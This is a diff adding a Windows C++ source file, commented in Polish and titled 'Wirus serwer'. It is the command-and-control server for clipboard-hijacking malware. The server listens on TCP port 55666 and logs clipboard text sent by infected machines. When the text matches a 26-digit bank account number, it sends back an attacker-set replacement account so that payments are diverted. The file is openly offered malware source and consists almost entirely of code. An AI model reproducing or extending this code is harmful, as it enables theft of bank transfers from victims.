@@ -1,0 +1,217 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include <Windows.h>
+#include<string>
+#pragma comment(lib, "WSOCK32.lib")
+
+//dla watku odbierajacego polaczenia
+struct connectData
+{
+	HWND mainWinHandle;
+	HWND accField;
+	HWND clipHandle;
+};
+//dla watku odbierajacego konkretne dane
+struct clientThreadData
+{
+	HWND mainWinHandle;
+	HWND accField;
+	HWND clipHandle;
+	SOCKET si;
+};
+DWORD WINAPI connectionFunction(void* argumenty);
+
+DWORD WINAPI clientThread(void* argumenty);
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+
+//main
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
+{
+	const wchar_t CLASS_NAME[] = L"Virus-Serv";
+
+	WNDCLASS wc = {};
+
+	wc.lpfnWndProc = WindowProc;
+	wc.hInstance = hInstance;
+	wc.lpszClassName = CLASS_NAME;
+	HBRUSH hb = CreateSolidBrush(RGB(0, 0, 255));
+	wc.hbrBackground = hb;
+
+	RegisterClass(&wc);
+	//glowne okno
+	HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"Wirus serwer",
+		WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 490, 360, NULL, NULL, hInstance, NULL);
+	//pole tekstowe z numerem konta
+	HWND accnumber = CreateWindowEx(WS_EX_WINDOWEDGE, TEXT("Edit"), TEXT("98798798798798798798798798"),
+		WS_CHILD | WS_VISIBLE, 10, 145, 220, 30, hwnd, NULL, NULL, NULL);
+	//pole z zawartoscia schowkow
+	HWND clipboards = CreateWindowEx(WS_EX_WINDOWEDGE, TEXT("Static"), TEXT(""),
+		WS_CHILD | WS_VISIBLE, 240, 10, 220, 300, hwnd, NULL, NULL, NULL);
+
+	
+	PAINTSTRUCT ps;
+	HDC hdc = BeginPaint(hwnd, &ps);
+	SetBkMode(hdc, TRANSPARENT);
+	SetTextColor(hdc, RGB(255, 255, 255));
+	TextOut(hdc, 10, 130, L"Zmieniany numer: ", 18);
+	EndPaint(hwnd, &ps);
+
+	connectData dane;
+	dane.mainWinHandle = hwnd;
+	dane.accField = accnumber;
+	dane.clipHandle = clipboards;
+
+	DWORD id;
+	HANDLE listeningThread = CreateThread(
+		NULL,           
+		0,              
+		connectionFunction,  
+		(void*)&dane,
+		0,              
+		&id);
+
+	if (listeningThread != INVALID_HANDLE_VALUE)
+	{
+		SetThreadPriority(listeningThread, THREAD_PRIORITY_NORMAL);
+	}
+
+	MSG message;
+
+	//ShowWindow(hwnd, nCmdShow);
+
+	while (GetMessage(&message, (HWND)NULL, 0, 0))
+	{
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
+
+	return message.wParam;
+}
+
+bool ifTextAccNumber(char* text)
+{
+	int length = 0;
+	int textLen = strlen(text);
+	for (int i = 0; i < textLen; i++)
+	{
+		if ((text[i] < '0' || text[i] > '9') && text[i] != ' ')
+		{
+			return false;
+		}
+		else if(text[i] != ' ')
+		{
+			
+			length++;	
+		}
+	}
+	if (length == 26)
+		return true;
+	return false;
+}
+
+DWORD WINAPI connectionFunction(void* args)
+{
+	struct connectData* conData = (struct connectData*)args;
+	WSADATA wsas;
+	int result;
+	WORD ver;
+	ver = MAKEWORD(1, 1);
+	result = WSAStartup(ver, &wsas);
+
+	SOCKET  listenSock;
+	listenSock = socket(AF_INET, SOCK_STREAM, 0);
+	struct  sockaddr_in  sockAddr;
+	memset((void*)(&sockAddr), 0, sizeof(sockAddr));
+	sockAddr.sin_family = AF_INET;
+	sockAddr.sin_port = htons(55666);
+	sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+	result = bind(listenSock, (struct sockaddr FAR*) &sockAddr, sizeof(sockAddr));
+	result = listen(listenSock, 5);
+
+	SOCKET  clientSock;
+	while (1)
+	{
+		clientSock = accept(listenSock, NULL, NULL);
+
+		clientThreadData dataForClient;
+		dataForClient.si = clientSock;
+		dataForClient.mainWinHandle = conData->mainWinHandle;
+		dataForClient.accField = conData->accField;
+		dataForClient.clipHandle = conData->clipHandle;
+		DWORD id;
+		HANDLE cliThreadHandle = CreateThread(
+			NULL,           // atrybuty bezpieczeństwa
+			0,              // inicjalna wielkość stosu
+			clientThread,  // funkcja wątku
+			(void*)&dataForClient,// dane dla funkcji wątku
+			0,              // flagi utworzenia
+			&id);
+		if (cliThreadHandle != INVALID_HANDLE_VALUE)
+		{
+			SetThreadPriority(cliThreadHandle, THREAD_PRIORITY_NORMAL);
+		}
+
+	}
+
+
+	return 0;
+}
+
+DWORD WINAPI clientThread(void* args)
+{
+	struct clientThreadData* clientData = (struct clientThreadData*)args;
+
+	SOCKET si = clientData->si;
+	char  buf[100];
+	while (recv(si, buf, 100, 0) > 0)
+	{
+		int outLength = GetWindowTextLengthA(clientData->clipHandle) + strlen(buf) + 2;
+
+		//bufor na tekst stary+nowy
+		char* newBuf = (char*)GlobalAlloc(GPTR, outLength * sizeof(char));
+		if (newBuf == NULL)
+		{
+			GlobalFree(newBuf);
+			continue;
+		}
+
+		// istniejacy tekst wklejam do nowego bufora
+		GetWindowTextA(clientData->clipHandle, newBuf, outLength - strlen(buf) + 2);
+
+		// doklejam znak nowej linii i tekst przeslany przez wirusa
+		strcat(newBuf, buf);
+		strcat(newBuf, "\n");
+
+		SetWindowTextA(clientData->clipHandle, newBuf);
+
+		GlobalFree(newBuf);
+
+		if (ifTextAccNumber(buf))
+		{
+			GetWindowTextA(clientData->accField, buf, GetWindowTextLengthA(clientData->accField) + 1);
+			send(si, buf, 100, 0);
+		}
+
+	};
+
+	return 0;
+}
+
+
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+	switch (message)
+	{
+	case WM_CREATE:
+		return (0);
+
+	case WM_DESTROY:
+		PostQuitMessage(0);
+		return (0);
+
+	default:
+		return DefWindowProc(hwnd, message, wParam, lParam);
+	}
+}
